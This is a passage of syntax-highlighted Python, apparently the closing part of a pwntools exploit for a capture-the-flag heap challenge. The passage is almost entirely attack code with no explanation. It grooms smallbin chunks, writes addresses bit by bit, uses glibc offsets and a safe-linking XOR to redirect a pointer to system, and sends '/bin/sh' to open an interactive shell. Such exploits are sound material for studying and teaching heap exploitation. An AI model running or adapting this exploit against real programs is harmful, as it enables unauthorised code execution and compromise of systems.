<span class="n">pad</span><span class="p">(</span><span class="s2">"heap"</span><span class="p">,</span><span class="n">heap</span><span class="p">)</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"libc"</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>

<span class="c1"># gdb.attach(p,b_string)</span>
<span class="c1"># gdb.attach(p,b_string)</span>
<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0x40</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="p">)</span>

<span class="n">size</span> <span class="o">=</span> <span class="mh">0x520</span>
<span class="n">bk_fd</span> <span class="o">=</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x1b30</span>
<span class="n">fd_bk</span> <span class="o">=</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x1b30</span>
<span class="n">fd</span> <span class="o">=</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x1b50</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">fd</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"heap head -&gt; "</span><span class="p">,</span><span class="n">fd_bk</span><span class="p">)</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"smallbin_head -&gt; "</span><span class="p">,</span><span class="n">fd_bk</span><span class="o">+</span><span class="n">size</span><span class="p">)</span>
<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0x40</span>
<span class="n">write_addr</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x408</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x30</span><span class="p">,</span><span class="n">size</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">write_addr</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x410</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x30</span><span class="p">,</span><span class="n">fd</span><span class="p">)</span>
<span class="n">write_addr</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x418</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x30</span><span class="p">,</span><span class="n">bk</span><span class="p">)</span>
<span class="n">write_addr</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x420</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x20</span><span class="p">,</span><span class="n">bk_fd</span><span class="p">)</span>
<span class="n">write_addr</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x428</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x20</span><span class="p">,</span><span class="n">fd_bk</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0x40</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>
<span class="c1">#gdb.attach(p,b_string)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">auto_read</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x438</span><span class="p">,</span><span class="mh">0x101</span><span class="p">,</span><span class="mh">0x530</span><span class="p">)</span> <span class="c1">#smallbin 0xc0</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="s2">"/25"</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345638</span><span class="p">,</span><span class="mh">0x3f0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">pad</span><span class="p">(</span><span class="s2">"heap head -&gt; "</span><span class="p">,</span><span class="n">fd_bk</span><span class="p">)</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"smallbin_head -&gt; "</span><span class="p">,</span><span class="n">fd_bk</span><span class="o">+</span><span class="n">size</span><span class="p">)</span>

<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>

<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="s1">'/25'</span><span class="p">)</span>
<span class="n">free</span><span class="p">()</span>

<span class="n">IO_list</span> <span class="o">=</span> <span class="mh">0x21b680</span><span class="o">+</span><span class="n">libc</span>
<span class="n">system</span> <span class="o">=</span> <span class="mh">0x050d70</span> <span class="o">+</span> <span class="n">libc</span>
<span class="nb">abs</span> <span class="o">=</span> <span class="mh">0x21a050</span> <span class="o">+</span> <span class="n">libc</span>

<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="mh">0x5d0</span><span class="p">)</span>

<span class="c1"># write_addr(0x12345640,0x70,(abs)^((heap+0x1ba0)&gt;&gt;12))</span>
<span class="c1"># write_addr(0x12345640,0x80,(abs)^((heap+0x1ba0)&gt;&gt;12))</span>

<span class="k">def</span> <span class="nf">write_addr_1</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
        <span class="n">bit</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mi">1</span>
        <span class="c1"># print(f"bit:{bit}")</span>
        <span class="k">if</span> <span class="n">bit</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">:</span>
            <span class="n">add</span><span class="p">(</span><span class="mh">0x12345640</span><span class="o">+</span><span class="n">off</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">bit</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">delete</span><span class="p">(</span><span class="mh">0x12345640</span><span class="o">+</span><span class="n">off</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> 

<span class="n">write_addr_1</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,(</span><span class="nb">abs</span><span class="p">)</span><span class="o">^</span><span class="p">((</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x1ba0</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">))</span>

<span class="n">pad</span><span class="p">(</span><span class="s2">"libc"</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>
<span class="n">pad</span><span class="p">(</span><span class="s2">"heap"</span><span class="p">,</span><span class="n">heap</span><span class="p">)</span>
<span class="c1"># gdb.attach(p,b_string)</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>
<span class="n">creat</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>

<span class="n">write_addr</span><span class="p">(</span><span class="mh">0x12345640</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">system</span><span class="p">)</span>

<span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">sa</span><span class="p">(</span><span class="s2">"Please input ip: "</span><span class="p">,</span><span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>

<span class="n">inter</span><span class="p">()</span>
</pre></div>
</div>
</div>